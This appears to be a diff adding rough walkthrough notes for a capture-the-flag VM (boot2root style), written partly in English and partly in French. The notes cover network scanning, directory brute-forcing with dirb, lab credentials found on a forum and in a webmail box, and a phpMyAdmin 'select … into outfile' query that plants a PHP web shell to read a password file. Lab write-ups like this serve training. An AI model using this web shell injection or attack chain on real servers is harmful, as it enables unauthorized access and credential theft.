@@ -1,0 +1,27 @@
+Step0:  Find the adress IP of our VM
+        - find the adress IP of our machine: command ifconfig
+        - scan this IP with nmap: Result: address IP of the VM with 255 as padding
+Step1: Find the identifiers
+        - We use Drib (software) to find some of the most common url of the website
+            - git clone https://github.com/v0re/dirb.git
+            - ./configure && make
+            -./dirb https://[YOUR IP]/ wordlists/common.txt
+        - URL: https://IP/forum/index.php?id=6: we find a login: lmezard and password: !q\]Ej?*5K5cy*AJ and we can connect with these identifiers
+        mail: laurie@borntosec.net
+        all users:
+        admin
+        lmezard
+        qudevide
+        thor
+        wandre
+        zaz
+        - URL: https://IP/webmail: allows access to an online mailbox (SquirelMail)
+        In one of the emails received, there are mentionned root/Fg-'kKXBj87E:aJ$ as database identifiers
+        - URL: https://IP/phpmyadmin:
+        shellcode execution with malicious injection:
+            select "<?php $output = shell_exec('cat /home/LOOKATME/password'); echo $output ?>" into outfile "/var/www/forum/templates_c/test.php" 
+        lmezard/G!@M6f4Eatau{sF"
+        questions: why templates_c
+Step2: Use identifiers
+        - connect to the VM: a Readme file is found + an archive file, we scp cette archine sur un serveur privé puis sur les mahines de 42 pour pouvoir l'exploiter.
+        scp lmezard@IP:/home/lmezard/fun fun
